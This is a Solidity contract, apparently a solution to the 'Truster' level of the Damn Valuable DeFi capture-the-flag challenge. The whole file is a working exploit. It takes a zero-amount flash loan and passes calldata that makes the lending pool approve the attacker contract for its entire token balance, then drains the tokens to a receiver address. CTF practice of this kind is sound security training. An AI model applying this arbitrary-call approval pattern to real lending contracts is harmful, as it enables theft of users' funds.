pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterExploit
 * @author Jasmine Abtahi
 */
contract TrusterExploit {

    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable pool;

    constructor(DamnValuableToken _token, TrusterLenderPool _pool) {
        token = _token;
        pool = _pool;
    }

    function attack(address receiver) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", 
                                                    address(this), 
                                                    token.balanceOf(address(pool)));

        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), receiver, token.balanceOf((address(pool))));
    }
}
